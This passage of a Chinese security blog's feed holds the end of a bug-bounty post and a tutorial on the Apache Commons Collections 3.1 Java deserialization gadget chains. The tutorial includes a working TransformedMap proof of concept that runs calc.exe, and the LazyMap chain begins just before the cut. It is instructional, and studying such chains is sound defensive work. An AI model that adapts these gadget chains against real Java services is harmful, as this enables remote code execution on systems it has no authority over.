href="#4-细心和耐心和一些运气" class="headerlink" title="4.细心和耐心和一些运气"></a>4.细心和耐心和一些运气</h5><p>心细挖天下，再加上一些运气，可能高危严重就到手了。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p> 挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SRC混子的漏洞挖掘之道&quot;&gt;&lt;a href=&quot;#SRC混子的漏洞挖掘之道&quot; class=&quot;headerlink&quot; title=&quot;SRC混子的漏洞挖掘之道&quot;&gt;&lt;/a&gt;SRC混子的漏洞挖掘之道&lt;/h2&gt;&lt;p&gt;本文首先于先知社区:&lt;a href=&quot;https://xz.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从apache-commons-collections中学习java反序列化</title>
    <link href="https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/"/>
    <id>https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/</id>
    <published>2020-11-25T08:42:12.000Z</published>
    <updated>2020-11-25T09:20:52.962Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区:<a href="https://xz.aliyun.com/t/8500" target="_blank" rel="noopener">从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    java安全学习的第一篇文章，<strong>apache commons collections3.1</strong>的反序列化漏洞是java历史上最出名同时也是最具有代表性的反序列化漏洞，废话不多说，我们直接上手分析。希望能帮助到和我一样的初学者。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>jdk 1.7版本</li><li>IntelliJ IDEA<ul><li>File -&gt; Project Structure -&gt;Modules-&gt; Dependencies -&gt;JARs or directories</li></ul></li><li>commons-collections-3.1 jar<ul><li>可以直接使用idea自带的maven下载依赖包:</li><li><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></li></ul></li></ul><h3 id="基础知识准备"><a href="#基础知识准备" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><h4 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h4><p>​    反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</p><p>​    Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java.lang.Class;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Constructor</span>;</span></span><br><span class="line">Java.lang.reflect.Field;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Method</span>;</span></span><br><span class="line">Java.lang.reflect.Modifier;</span><br></pre></td></tr></table></figure><h5 id="获取反射中的Class对象"><a href="#获取反射中的Class对象" class="headerlink" title="获取反射中的Class对象"></a>获取反射中的Class对象</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>forName 静态方法</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br><span class="line">#使用 .<span class="keyword">class</span> 方法。</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">#使用类对象的 get<span class="constructor">Class()</span> 方法</span><br><span class="line">String str = <span class="keyword">new</span> <span class="constructor">String(<span class="string">"Hello"</span>)</span>;</span><br><span class="line">Class clz = str.get<span class="constructor">Class()</span>;</span><br></pre></td></tr></table></figure><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应<span class="keyword">Class</span>的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">Method</span> <span class="title">getMethod</span><span class="params">(String name, <span class="keyword">Class</span>&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure><h5 id="反射Runtime执行本地命令"><a href="#反射Runtime执行本地命令" class="headerlink" title="反射Runtime执行本地命令"></a>反射Runtime执行本地命令</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>​    类似php中反序列化使用的魔术方法，比如__destruct函数。在java中，<strong>readObject</strong>方法在反序列化漏洞时起到了至关重要的作用，利用ObjectInputStream的readObject方法进行对象读取的时候，<strong>当readObject()方法被重写的时候，反序列化该类时调用的就是重写的方法。</strong></p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> writeObject(ObjectOutputStream oos)  <span class="comment">//自定义序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois)  <span class="comment">//自定义反序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObjectNoData()</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> writeReplace()  <span class="comment">//写入时替换对象。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> readResolve()</span><br></pre></td></tr></table></figure><p>反序列化时会自动调用readObject(ObjectInputStream)方法。我们通过在需要序列化/反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法从而实现自定义的序列化和反序列化操作。</p><h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>我们在分析cc链反序列化化漏洞的主要思路其实就是两条:</p><ul><li>利用<code>InvokerTransformer</code> 、 <code>ConstantTransformer</code> 、 <code>ChainedTransformer</code> 等类构建反射链，利用java的反射机制，然后通过类中的transformer类来调用。</li><li>找Common Collections中的类在反序列化时，会触发调用 <code>transform</code> 方法的情况，并以此来构建反序列化漏洞的攻击链。</li></ul><p>接下来我们使用IDEA跟进代码进行审计</p><h4 id="一、寻找反射链"><a href="#一、寻找反射链" class="headerlink" title="一、寻找反射链"></a>一、寻找反射链</h4><h5 id="org-apache-commons-collections-functors-InvokerTransformer"><a href="#org-apache-commons-collections-functors-InvokerTransformer" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer"></a>org/apache/commons/collections/functors/InvokerTransformer</h5><p><strong>IDEA跟进类中(48~61行):</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107192725.png" alt=""></p><p>​    可以看到此处的transform方法调用了java的反射机制,并且发现<code>this.iMethodName</code> , <code>this.iParamTypes</code>, <code>this.iArgs</code>我们都是可以直接输入的。而<code>input</code>是在函数调用的时候传入的，我们同样是可控的。</p><p>当我们向对应参数传入以下值，即可以调用代码执行:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107194652.png" alt=""></p><p>​    <strong>存在一组可控的反射调用</strong>是cc链存在反序列化漏洞的根本原因，但是这里我们只能只能在本地服务器上执行。是无法达成我们想要远程执行命令的效果，这里主要的限制是我们没有没有办法直接传入Runtime类的实例对象。</p><p>要想真正的形成调用链，我们仍然需要利用java的反射机制来调用函数，并且至少要调用四个方法:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getMethod</span><span class="params">()</span>, <span class="title">getRuntime</span><span class="params">()</span>, <span class="title">exec</span><span class="params">()</span> ,<span class="title">invoke</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>所以我们之后找到了<code>ChainedTransformer</code> 类。</p><h5 id="org-apache-commons-collections-functors-ChainedTransformer"><a href="#org-apache-commons-collections-functors-ChainedTransformer" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer"></a>org/apache/commons/collections/functors/ChainedTransformer</h5><p><strong>IDEA跟进53~63行</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107200130.png" alt=""></p><p>简单的分析代码逻辑，该类的构造函数接受一个数组，我们只需要传入一个数组<code>chainedTransformer</code>就可以依次去调用每一个类的transform方法。</p><h4 id="org-apache-commons-collections-functors-ConstantTransformer"><a href="#org-apache-commons-collections-functors-ConstantTransformer" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer"></a>org/apache/commons/collections/functors/ConstantTransformer</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20201107212925.png" alt=""></p><p>接口函数，在上面的循环中进入了不同的函数。给一个初始的object，然后输出作为下一个输入，从而实现链式调用。</p><p><strong>最后的反射poc如下:</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[] &#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.class, Class[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="type">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;Object.class, Object[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="type">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用exec方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>我们已经构造好了恶意的反射链条，现在我们的目标是触发该类的transform方法。</p><h4 id="二、寻找触发链"><a href="#二、寻找触发链" class="headerlink" title="二、寻找触发链"></a>二、寻找触发链</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某个类的readObject方法</span><br><span class="line">-&gt;一系列调用</span><br><span class="line">-&gt;Transformerchain的transformer方法</span><br><span class="line">-&gt;执行反射链</span><br><span class="line">-&gt;执行Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;)</span><br></pre></td></tr></table></figure><ul><li>找到一个 <code>tansform()</code> 方法 , 该方法所属的实例对象是可控的</li><li>找到一个重写的 <code>readObject()</code> 方法 , 该方法会自动调用 <code>transform()</code> 方法.</li></ul><h4 id="JDK1-7–TransformedMap利用链"><a href="#JDK1-7–TransformedMap利用链" class="headerlink" title="JDK1.7–TransformedMap利用链"></a>JDK1.7–TransformedMap利用链</h4><p>​    <strong>Transmap类</strong>在一个元素被添加/删除/或是被修改时，会调用transform方法。我们可以通过TransformedMap.decorate()方法获得一个TransformedMap的实例。</p><p>​     因此，我们可以先构造一个TransformeMap实例,然后修改其中的数据，然后使其自动调用我们之前设定好的transform()方法。</p><h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链:"></a>调用链:</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt;TransformedMap.entrySet().iterator().next().setValue()</span><br><span class="line">-&gt;TransformedMap.checkSetValue()</span><br><span class="line"><span class="function"> -&gt;</span>TransformedMap.transform()</span><br><span class="line">-&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>首先看<code>/org/apache/commons/collections/map/TransformedMap</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map <span class="built_in">map</span>, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        super(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <code>TransformedMap</code>中的<code>valueTransformer</code>在初始化时我们是可控的.</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> put(<span class="keyword">Object</span> <span class="built_in">key</span>, <span class="keyword">Object</span> value) &#123;</span><br><span class="line">        <span class="built_in">key</span> = <span class="keyword">this</span>.transformKey(<span class="built_in">key</span>);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(<span class="built_in">key</span>, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当执行put方法时会进入<code>transformValue</code>方法:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object transformValue(Object <span class="keyword">object</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="literal">null</span> ? <span class="keyword">object</span> : <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">object</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以控制这里的<code>valueTransformer</code>值为ChianedTransformer即可触发利用链。</p><p><strong>但是目前的构造仍然需要Map中的某一项去调用setValue(),我们如果想要在反序列化调用readObject()时直接触发呢?</strong></p><h5 id="AbstractInputCheckedMapDecorator类"><a href="#AbstractInputCheckedMapDecorator类" class="headerlink" title="AbstractInputCheckedMapDecorator类"></a>AbstractInputCheckedMapDecorator类</h5><p>​    调用java自带类<code>AnnotationInvocationHandler</code>中重写的readObject方法，该方法调用时会先将map转为Map.entry,然后执行setvalue操作。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var5</span><span class="selector-class">.setValue</span>((<span class="selector-tag">new</span> <span class="selector-tag">AnnotationTypeMismatchExceptionProxy</span>(<span class="selector-tag">var8</span><span class="selector-class">.getClass</span>() + "<span class="selector-attr">[<span class="string">" + var8 + "</span>]</span>"))<span class="selector-class">.setMember</span>((<span class="selector-tag">Method</span>)<span class="selector-tag">var2</span><span class="selector-class">.members</span>()<span class="selector-class">.get</span>(<span class="selector-tag">var6</span>)));</span><br></pre></td></tr></table></figure><p>TransformedMap利用Map.Entry取得第一个值，调用修改值的函数，会触发的setValue()代码</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">            <span class="keyword">value</span> = <span class="keyword">this</span>.parent.checkSetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.entry.setValue(<span class="keyword">value</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>接着到了TransoformedMap的checkSetValue()方法。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span>(<span class="params">Object <span class="keyword">value</span></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(<span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这里的valueTransformer.transform实际上就是ChianedTransformer类的transform方法。就会触发刚刚我们构造的反射链。</p><h5 id="最后的POC："><a href="#最后的POC：" class="headerlink" title="最后的POC："></a>最后的POC：</h5><p>这里直接上其他大师傅们的poc:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Serialize2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> ApacheSerialize2 implements <span class="keyword">Serializable</span> &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) throws <span class="keyword">Exception</span>&#123;</span><br><span class="line">         Transformer[] transformers = <span class="built_in">new</span> Transformer[]&#123;</span><br><span class="line">                 <span class="built_in">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("getMethod", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"getRuntime", <span class="built_in">new</span> <span class="keyword">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("invoke", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">Object</span>.<span class="keyword">class</span>, <span class="keyword">Object</span>[].<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="keyword">null</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                 <span class="built_in">new</span> InvokerTransformer("exec", <span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"calc.exe"&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line">         Transformer transformerChain = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">         Map map = <span class="built_in">new</span> HashMap();</span><br><span class="line">         map.put("value", "sijidou");</span><br><span class="line">         Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">Class</span> cl = <span class="keyword">Class</span>.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span><br><span class="line">         Constructor ctor = cl.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">         ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         <span class="keyword">Object</span> instance = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap);</span><br><span class="line"></span><br><span class="line">         //序列化</span><br><span class="line">         FileOutputStream fileOutputStream = <span class="built_in">new</span> FileOutputStream("serialize3.txt");</span><br><span class="line">         ObjectOutputStream objectOutputStream = <span class="built_in">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(instance);</span><br><span class="line">         objectOutputStream.<span class="keyword">close</span>();</span><br><span class="line"></span><br><span class="line">         //反序列化</span><br><span class="line">         FileInputStream fileInputStream = <span class="built_in">new</span> FileInputStream("serialize3.txt");</span><br><span class="line">         ObjectInputStream objectInputStream = <span class="built_in">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">         <span class="keyword">Object</span> result = objectInputStream.readObject();</span><br><span class="line">         objectInputStream.<span class="keyword">close</span>();</span><br><span class="line">         <span class="keyword">System</span>.<span class="keyword">out</span>.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20201108122458.png" alt=""></p><h4 id="JDK1-8–LazyMap利用链"><a href="#JDK1-8–LazyMap利用链" class="headerlink" title="JDK1.8–LazyMap利用链"></a>JDK1.8–LazyMap利用链</h4><p>​    对于JDK 1.8来说，<code>AnnotationInvocationHandler</code>类中关键的触发点，setvalue发生了改变。所以我们需要寻找新的类重写readObject来实现调用，</p><h5 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化BadAttributeValueExpException</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span><span class="keyword">to</span><span class="constructor">String()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span>get<span class="constructor">Value()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>我们首先看一下LazyMap这个类,这个类也实现了一个map接口:</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> LazyMap(Map <span class="built_in">map</span>, Transformer factory)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">super</span>(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.<span class="built_in">map</span>.containsKey(<span class="built_in">key</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">Object</span> value = <span class="keyword">this</span>.factory.transform(<span class="built_in">key</span>); </span><br><span class="line">    <span 